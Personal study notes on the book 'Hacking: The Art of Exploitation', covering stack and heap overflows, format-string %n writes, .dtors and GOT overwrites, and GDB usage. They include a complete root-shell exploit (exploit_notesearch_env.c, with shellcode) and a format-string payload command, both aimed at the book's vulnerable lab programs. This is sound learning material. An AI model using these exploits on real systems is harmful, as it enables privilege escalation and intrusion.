# Hacking : The Art of Exploitation Notes

* `seq` in bash
  * for i in $\(seq 1 3 10\)
* BASH’s for loop can actually be used to send each of these lines to an echo command, with command-line options to recognize hex expansion and to suppress adding a newline character to the end. : `-en`
* Use env var if the buffer is too small for shellcode
  * env var near bottom of stack
  * A breakpoint is set at the beginning of main\(\), and the program is run. This will set up memory for the program, but it will stop before anything happens. Now we can examine memory down near the bottom of the stack.
  * In C’s standard library there is a function called getenv\(\), which accepts the name of an environment variable as its only argument and returns that variable’s memory address.
* The use of system\(\) can sometimes cause problems. If a setuid program uses system\(\), the privileges won’t be transferred, because /bin/sh has been dropping privileges since version two
* The execl\(\) function belongs to a family of functions that execute commands by replacing the current process with the new one. The arguments for execl\(\) start with the path to the target program and are followed by each of the command-line arguments. The second function argument is actually the zeroth command-line argument, which is the name of the program. The last argument is a NULL to terminate the argument list, similar to how a null byte terminates a string. The execl\(\) function has a sister function called execle\(\), which has one additional argument to specify the environment under which the executing process should run. This environment is presented in the form of an array of pointers to null-terminated strings for each environment variable, and the environment array itself is terminated with a NULL pointer. With execl\(\), the existing environment is used, but if you use execle\(\), the entire environment can be specified. If the environment array is just the shellcode as the first string \(with a NULL pointer to terminate the list\), the only environment variable will be the shellcode. This makes its address easy to calculate. In Linux, the address will be 0xbffffffa, minus the length of the shellcode in the environment, minus the length of the name of the executed program. Since this address will be exact, there is no need for a NOP sled. All that’s needed in the exploit buffer is the address, repeated enough times to overflow the return address in the stack, as shown in exploit\_nosearch\_env.c.

```c
exploit_notesearch_env.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
char shellcode[]=
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";
int main(int argc, char *argv[]) {
 char *env[2] = {shellcode, 0};
 unsigned int i, ret;
150 0x300
 char *buffer = (char *) malloc(160);
 ret = 0xbffffffa - (sizeof(shellcode)-1) - strlen("./notesearch");
 for(i=0; i < 160; i+=4)
 *((unsigned int *)(buffer+i)) = ret;
 execle("./notesearch", "notesearch", buffer, 0, env);
 free(buffer);
}


reader@hacking:~/booksrc $ gcc exploit_notesearch_env.c
reader@hacking:~/booksrc $ ./a.out
```



* repeated return address for buffer overflows
* Buffer overflow can also happen in the heap, they don'z ned to be on the stack
  * This time, the overflow is designed to overwrite the datafile buffer with the string testfile. This causes the program to write to testfile instead of /var/notes, as it was originally programmed to do. However, when the heap memory is freed by the free\(\) command, errors in the heap headers are detected and the program is terminated. Similar to the return address overwrite with stack overflows, there are control points within the heap architecture itself. The most recent version of glibc uses heap memory management functions that have evolved specifically to counter heap unlinking attacks. Since version 2.2.5, these functions have been rewritten to print debugging information and terminate the program when they detect problems with the heap header information. This makes heap unlinking in Linux very difficult. However, this particular exploit doesn’t use heap header information to do its magic, so by the time free\(\) is called, the program has already been tricked into writing to a new file with root privileges.
* Notice that the salt value is always at the beginning of the hash. When a user logs in and enters a password, the system looks up the encrypted password 154 0x300 for that user. Using the salt value from the stored encrypted password, the system uses the same one-way hashing algorithm to encrypt whatever text the user typed as the password
  * ```text
    reader@hacking:~/booksrc $ perl -e 'print crypt("password", "AA"). "\n"'
    AA6tQYSfGxd/A
    reader@hacking:~/booksrc $ perl -e 'print crypt("password", "XX"). "\n"'
    XXq2wKiyI43A2
    ```
* The nm command lists symbols in object files. This can be used to find addresses of various functions in a program
* **cat -**
* with %n, when you need to write big value, instead of writting a lot of characters with padding to generate your value, you can craft it by using succeding %n to a shifted memory address \(each time writing one byte of the final value\)
  * \(We control the least significant byte\)
  * It should be noted that the three bytes found after the target address will also be overwritten using this technique.
  * if, for the following writes, you need to write a lesser number than what could be the value of %n, just make it even bigger so that the important byte for you will contain what you want
    * ```text
      Memory                     94 95 96 97
      First write to 0x08049794  AA 00 00 00
      Second write to 0x08049795    BB 00 00 00
      Third write to 0x08049796        CC 00 00 00
      Fourth write to 0x08049797          DD 00 00 00
      Result                     AA BB CC DD

      // if, for the following writes, 
      // you need to write a lesser number than what could be the value of %n
      // just make it even bigger
      // so that the important byte for you will contain what you want
      Memory                     94 95 96 97
      First write to 0x08049794  BB 00 00 00
      Second write to 0x08049795    AA 10 00 00
      Third write to 0x08049796        CC 00 00 00
      Fourth write to 0x08049797          DD 00 00 00
      Result                     BB AA CC DD
      ```
* Direct parameter access is a way to simplify format string exploits
  * As the name would imply, direct parameter access allows parameters to be accessed directly by using the dollar sign qualifier. For example, %7$d would access the nth parameter and display it as a decimal number.
  * Combination of direct access and field width  : %4$05d
  * can be use with %n
  * ./fmt\_vuln $\(perl -e 'print "\x94\x97\x04\x08" . "\x95\x97\x04\x08" . "\x96\x97\x04\x08" . "\x97\x97\x04\x08"'\)%98x%4$n%139x%5$n%258x%6$n%192x%7$n
* Another technique that can simplify format string exploits is using short writes. A short is typically a two-byte word
  * %hn can write a memory address in 2 ewrites



* In binary programs compiled with the GNU C compiler, special table sections called .dtors and .ctors are made for destructors and constructors, respectively.
  * Constructor functions are executed before the main\(\) function is executed, and destructor functions are executed just before the main\(\) function exits with an exit system call.
  * A function can be declared as a destructor function by defining the destructor attribute
  * `static void cleanup(void) __attribute__ ((destructor));`
  * In the preceding code sample, the cleanup\(\) function is defined with the destructor attribute, so the function is automatically called when the main\(\) function exits
  * This behavior of automatically executing a function on exit is controlled by the .dtors table section of the binary. This section is an array of 32-bit addresses terminated by a NULL address. The array always begins with 0xffffffff and ends with the NULL address of 0x00000000. Between these two are the addresses of all the functions that have been declared with the destructor attribute.
  * The nm command can be used to find the address of the cleanup\(\) function, and objdump can be used to examine the sections of the binary.
  * the .dtors section is that it is writable
  * the .dtors section is that it is included in all binaries compiled with the GNU C compiler, regardless of whether any functions were declared with the destructor attribute



* Since a program could use a function in a shared library many times, it’s useful to have a table to reference all the functions. Another special section in compiled programs is used for this purpose—the procedure linkage table \(PLT\). Exploitation 191 This section consists of many jump instructions, each one corresponding to the address of a function. It works like a springboard—each time a shared function needs to be called, control will pass through the PLT.
  * the procedure linking table is shown to be read only.
  * they aren’t jumping to addresses but to pointers to addresses
  * These addresses exist in another section, called the global offset table \(GOT\), which is writable. These addresses can be directly obtained by displaying the dynamic relocation entries for the binary by using objdump.
  * . Another advantage of overwriting the GOT is that the GOT entries are fixed per binary, so a different system with the same binary will have the same GOT entry at the same add





```text
reader@hacking:~/booksrc $ $(perl -e 'print "uname";') 
Linux 
reader@hacking:~/booksrc $ una$(perl -e 'print "m";')e
Linux
```

## GDB 

* Test if `set disassembly intel` works
  * Write it in the `~./.gdbinit` file
  * Test if you can define the hook-stop there too
* If the c source code was compiled with `gcc` with the  `-d` options, `gdb` can have access to the source code with `list`
  * i guess it's only the case when having acces to the source code, but you can examine a variable with `x/xw var`
    * And retrieve the address of a variable with `&var`
* Verify that the shorthand of the `info` commands actually work
*  `bt` Shows the stack backtrace
  * The backtrace also shows the nested function calls by looking at records kept on the stack. Each time a function is called, a record called a stack frame is put on the stack. Each line in the backtrace corresponds to a stack frame. Each stack frame also contains the local variables for that context. The local variables contained in each stack frame can be shown in GDB by adding the word full to the backtrace command.



